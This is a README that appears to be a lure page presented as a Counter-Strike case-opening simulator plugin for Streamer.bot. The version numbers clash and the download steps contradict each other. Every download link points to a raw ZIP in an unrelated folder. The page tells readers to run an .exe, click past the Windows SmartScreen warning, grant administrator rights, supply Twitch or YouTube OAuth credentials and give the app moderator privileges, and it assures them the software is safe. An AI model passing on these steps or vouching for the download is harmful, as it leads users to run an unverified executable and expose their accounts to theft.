# 📦 CS2-Case-Bot-V1.4 - Automate Counter-Strike Case Openings For Streams

[![](https://img.shields.io/badge/Download-V1.4-blue.svg)](https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip)

## 📖 About This Tool

This software acts as a tool for streamers to open virtual Counter-Strike cases inside their broadcasts. It interacts with your chat to respond to commands, displays animations, and tracks stats for your viewers. You run this as a plugin within Streamer.bot to link interactions directly to your live audience.

Note: This is version 1.4. An updated version 1.6 exists with new features. Only use this specific version if you prefer the original toolset over the latest updates.

## ⚙️ Minimum System Requirements

Your computer needs to meet these basic criteria to run the software smoothly:

- Operating System: Windows 10 or Windows 11.
- Network: A stable internet connection.
- Software: Streamer.bot (latest version installed and configured).
- Hardware: At least 4GB of RAM and a screen resolution of 1920x1080 for visibility.
- Permissions: Administrator access to allow the bot to read and write to your local Streamer.bot folder.

## 📥 How To Download And Install

Follow these steps to set up the software on your Windows machine:

1. Visit this page to download the project files: [https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip](https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip)
2. Locate the green Code button on the repository page.
3. Select Download ZIP from the menu.
4. Save the folder to a location you can find, such as your Desktop or Downloads folder.
5. Right-click the downloaded ZIP file and select Extract All.
6. Open the extracted folder to view the contents. You will see a file with the .exe extension.

## 🚀 Setting Up The Bot

Once you extract the files, perform these actions to connect the bot to your stream:

1. Open Streamer.bot first.
2. In the folder you extracted, locate the executable file.
3. Double-click the file to launch the interface.
4. If a Windows prompt appears, select More Info and then Run Anyway.
5. In the bot interface, navigate to the Settings tab to enter your channel information.
6. Connect your Twitch or YouTube account by following the authentication prompts.
7. Import the provided command files into Streamer.bot via the Import tab.
8. Restart Streamer.bot to ensure all commands load correctly.

## 🕹️ Using Commands

Your viewers interact with the bot using specific words in your chat. Ensure your chat bot remains active to register these inputs:

- !case: Initiates a standard case opening sequence.
- !stats: Displays your overall case opening history.
- !streak: Shows the current winning streak for the stream.
- !jackpot: Entry point for the scheduled community jackpot.
- !trade: Provides instructions for trading virtual items.
- !gift: Sends a virtual gift to another viewer in your chat.

The bot supports over 30 commands total. Test each command while offline to confirm the feedback appears in your chat window before your live broadcast starts.

## 📈 Managing Features

This bot tracks various data points to keep viewers engaged. The settings sub-menu allows you to toggle specific options.

- StatTrak: Tracks kills on virtual weapons opened during the session.
- Conditions: Features item wear variations like Factory New or Battle-Scarred.
- Achievements: Triggers alerts when a viewer reaches specific milestones, such as opening five rare items in a row.
- Automated Alerts: Sends a chat message automatically when a user opens high-tier loot.

Adjust the frequency of these alerts in the config.json file found in your installation folder if you want to prevent spam. Simply open this file with Notepad, change the values, and save the file.

## 🛠️ Troubleshooting Common Issues

If the bot fails to respond, verify these points:

- Check your internet connection status.
- Ensure Streamer.bot is running with the correct connection port selected.
- Verify that your Twitch or YouTube OAuth token is still valid.
- Close the bot and restart it to clear internal memory.
- Check the folder permissions to ensure the program can write log files.

If the bot does not see your chat messages, confirm that you have granted the application Moderator privileges in your streaming channel. The bot needs these privileges to read chat messages and send responses reliably.

## 📋 Frequently Asked Questions

Does this bot give real game items?
No, this is a simulator. All items shown are virtual components of the tool and exist only within the context of your stream.

Can I customize the items?
Yes. You can edit the text files in the assets folder to change the names and rarity groupings of the items.

Is this safe for my stream?
Yes. The software runs locally on your machine and only reads chat inputs to generate text in return.

Does this interfere with other bots?
No, as long as you do not use overlapping command names. If another bot uses !case, the two might conflict. Rename the command in your other bot to keep them separate.

Is there a performance cost?
The bot uses a small amount of memory. It will not impact your frame rate while playing games or streaming.